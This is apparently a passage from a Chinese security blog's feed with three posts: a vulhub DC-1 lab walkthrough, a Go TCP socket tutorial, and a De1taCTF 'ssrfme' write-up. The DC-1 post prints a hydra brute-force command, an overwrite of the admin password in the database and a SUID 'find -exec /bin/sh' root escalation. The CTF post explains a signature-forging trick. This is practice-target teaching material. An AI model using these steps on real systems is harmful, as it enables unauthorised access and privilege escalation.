it’s not that easy.  Or maybe it is?<br>根据flag1.txt的提示找到网站的配置文件在site/default/settings.php<br>发现敏感信息</p><ul><li>flag2</li><li>Brute force and dictionary attacks aren’t the</li><li>only ways to gain access (and you WILL need access).</li><li>What can you do with these credentials?</li></ul><p>$databases = array (<br>  ‘default’ =&gt;<br>  array (<br>    ‘default’ =&gt;<br>    array (<br>      ‘database’ =&gt; ‘drupaldb’,<br>      ‘username’ =&gt; ‘dbuser’,<br>      ‘password’ =&gt; ‘R0ck3t’,<br>      ‘host’ =&gt; ‘localhost’,<br>      ‘port’ =&gt; ‘’,<br>      ‘driver’ =&gt; ‘mysql’,<br>      ‘prefix’ =&gt; ‘’,<br>    ),<br>  ),<br>);</p><hr><p>python调用bash python -c ‘import pyt;pyt.spawn(“/bin/bash”)’建立持续性连接<br>利用上面发现的敏感信息登录mysql数据库<br>mysql -udbuser -pR0ck3t<br>select * from users;找到密文和用户<br>密文无法破解于是使用<br>update users set pass = 一个已知明文的密文 where name = ‘admin’;<br>加密的方式在/var/www/scripts/password-hash.sh<br>php password-hash.sh admin123<br>生成密文进行覆盖<br>登录drupal之后在dashboard获得flag3<br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>提示获取shadow肯定是要提权的了<br>那么ssh连接<br>ssh <a href="mailto:&#102;&#108;&#x61;&#103;&#x34;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#52;&#54;&#46;&#x32;&#51;&#50;">&#102;&#108;&#x61;&#103;&#x34;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#52;&#54;&#46;&#x32;&#51;&#50;</a><br>不知道密码尝试一下爆破<br>hydra -l flag4 -P /usr/share/john/password.lst 192.168.146.232<br>得到密码orange<br>进入终端之后<br>尝试使用suid提权<br>尝试使用以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb {} ;</p><hr><p>找到一个熟悉的find命令在列，进行find提权操作<br>先验证是否可行<br>/usr/bin/find flag4.txt -exec ‘whoami’ ;<br>root<br>验证成功<br>/usr/bin/find . -exec /bin/sh  ; -quit<br>得到root权限<br>进入root目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat thefinalflag.txt</span></span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;vulhub-DC-1靶机渗透&quot;&gt;&lt;a href=&quot;#vulhub-DC-1靶机渗透&quot; class=&quot;headerlink&quot; title=&quot;vulhub DC-1靶机渗透&quot;&gt;&lt;/a&gt;vulhub DC-1靶机渗透&lt;/h1&gt;</summary>
    
    
    
    <category term="pentest" scheme="http://example.com/categories/pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>go语言实现简单的tcp通信</title>
    <link href="http://example.com/2021/01/09/go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84tcp%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2021/01/09/go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84tcp%E9%80%9A%E4%BF%A1/</id>
    <published>2021-01-09T10:45:38.000Z</published>
    <updated>2021-01-13T08:36:49.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="golang-tcp"><a href="#golang-tcp" class="headerlink" title="golang tcp"></a>golang tcp</h1><a id="more"></a><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>回到家里太冷了，北方的暖气真好，最近正好学完了golang的基础部分的东西，用net包实现以下tcp通信，正好也算是加深一下对计网的记忆</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>pc,wsl,vscode,golang</p><h3 id="思路以及代码"><a href="#思路以及代码" class="headerlink" title="思路以及代码"></a>思路以及代码</h3><h2 id="tcp是面向连接的协议嘛，所以肯定要有连接，因此我就写一个server端和一个client端进行通信"><a href="#tcp是面向连接的协议嘛，所以肯定要有连接，因此我就写一个server端和一个client端进行通信" class="headerlink" title="tcp是面向连接的协议嘛，所以肯定要有连接，因此我就写一个server端和一个client端进行通信"></a>tcp是面向连接的协议嘛，所以肯定要有连接，因此我就写一个server端和一个client端进行通信</h2><p>server端先确定要做哪些事情</p><ol><li>监听端口</li><li>等待连接</li><li>接收和发送信息<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">reader := bufio.NewReader(conn) <span class="comment">//读取conn中的对象</span></span><br><span class="line"><span class="keyword">var</span> buf = [<span class="number">512</span>]<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">n, err := reader.Read(buf[:]) <span class="comment">//使用reader中read方法读取数据</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;read from conn failed,err:%v\n&quot;</span>, err)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">rec := <span class="keyword">string</span>(buf[:n])</span><br><span class="line">fmt.Printf(<span class="string">&quot;%v&quot;</span>, rec)</span><br><span class="line">input := bufio.NewReader(os.Stdin)</span><br><span class="line">s, _ := input.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">conn.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//监听端口</span></span><br><span class="line">listen, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:4444&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;listen failed ,err::%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//等待连接</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listen.Accept() <span class="comment">//没有收到连接请求就一直堵塞</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;connect failed ,err:%v\n&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接收数据返回接受无误</span></span><br><span class="line"><span class="comment">//用一个gorutine去处理连接</span></span><br><span class="line"><span class="keyword">go</span> process(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>clint端负责请求连接和发送数据，输入Q的时候退出连接<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求连接</span></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//请求连接</span></span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:4444&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;dial failed,err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">input := bufio.NewReader(os.Stdin) <span class="comment">//从终端读入数据</span></span><br><span class="line">s, _ := input.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.ToUpper(s) == <span class="string">&quot;Q&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开始发送</span></span><br><span class="line">_, err = conn.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;write failed,err:&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接收server端返回的信息</span></span><br><span class="line">buf := [<span class="number">512</span>]<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">n, err := conn.Read(buf[:])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;read failed,err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(buf[:n]))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="通信截图"><a href="#通信截图" class="headerlink" title="通信截图"></a>通信截图</h3>使用nc和server进行通信<br><img src="/image/gotcp1.png" alt="nc-serv1"><br><img src="/image/gotcp2.png" alt="nc-serv2"><br>使用nc和client进行通信<br><img src="/image/gotcp3.png" alt="nc-cli1"><br><img src="/image/gotcp4.png" alt="nc-cli2"><br>使用server和client进行通信<br><img src="/image/gotcp5.png" alt="serv-cli1"></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;golang-tcp&quot;&gt;&lt;a href=&quot;#golang-tcp&quot; class=&quot;headerlink&quot; title=&quot;golang tcp&quot;&gt;&lt;/a&gt;golang tcp&lt;/h1&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>ssrfme</title>
    <link href="http://example.com/2021/01/01/ssrfme/"/>
    <id>http://example.com/2021/01/01/ssrfme/</id>
    <published>2021-01-01T06:15:29.000Z</published>
    <updated>2021-01-13T08:39:44.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buu-de1tactf-ssrfme"><a href="#buu-de1tactf-ssrfme" class="headerlink" title="buu de1tactf ssrfme"></a>buu de1tactf ssrfme</h1><a id="more"></a><p>正好更新了ssrf上一题来加深印象，这题难度适中，就是要捋清楚漏洞利用的逻辑链条，打ctf嘛，没有一个清晰的思路是不行的<br>贴源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>很显然这个是flask框架搭建起来的web，要对其进行代码审计，首先看路由函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>一个一个路由来看<br><img src="/image/ssrfme03.png" alt="ssrfme03"></p><p>接着跟进查看相关函数 /geneSign 相关的getsign()没啥可看的，就是一个生成签名，但是要注意的是param在前，action在后，直接看waf()限制不能使用gopher和file协议，接下来就是test对象的内置的exec()函数了，首先使用checkSgin()进行判断如果传入的action(challenge中通过cookie获取)和param(challenge中通过get方法获得)生成的签名和sign(challenge中通过cookie获取)进行比较，如果是相同的话则进入下一步判断如果scan在”action”中的话那么可以通过scan方法对param传入的值进行urlopen读取文件之后将读取的内容写入一个临时文件中如果read在”action”中的话，那么会读取前面的临时文件的内容</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们来捋一捋，action中必须要有scan和read，而且这两个值要和param进行拼接之后生成的md5签名要相同，题目提示flag在flag.txt那么我们肯定想要urlopen(flag.txt),所以我们在访问/De1ta路由的时候传入参数/De1ta?param=flag.txt 通过cookie传入”scanread”或者”readscan”当然你也可以传入”scanxxxreadxxx”等格式只要保证scan和read在action中即可，这两个条件都满足，我们来看看sign hashlib.md5(secert_key + <strong>flag.txt</strong> + readscan(scanread) ).hexdigest(),要和这个sign的值一致，所以我们就访问/geneSign路由因为/geneSign已经限定了<em>action的值为scan</em>那么我们跟进getSign()查看，加密的字符串为hashlib.md5(secert_key + param + <strong>scan</strong>).hexdigest(),那么要构成和上面的sign一致的值得话我们只能传入param=flag.txtread变成 hashlib.md5(secert_key + <strong>flag.txtread</strong> + <em>scan</em> ).hexdigest(),这样就能保持一致了</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><img src="/image/ssrfme01.png" alt="ssrfme01"><br><img src="/image/ssrfme02.png" alt="ssrfme02"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;buu-de1tactf-ssrfme&quot;&gt;&lt;a href=&quot;#buu-de1tactf-ssrfme&quot; class=&quot;headerlink&quot; title=&quot;buu de1tactf ssrfme&quot;&gt;&lt;/a&gt;buu de1tactf ssrfme&lt;/h1&gt;</summary>
    
    
    
    <category term="pentest" scheme="http://example.com/categories/pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="http://example.com/2021/01/01/ssrf/"/>
    <id>http://example.com/2021/01/01/ssrf/</id>
    <published>2021-01-01T01:36:03.000Z</published>
    <updated>2021-01-13T08:39:37.493Z</updated>
    
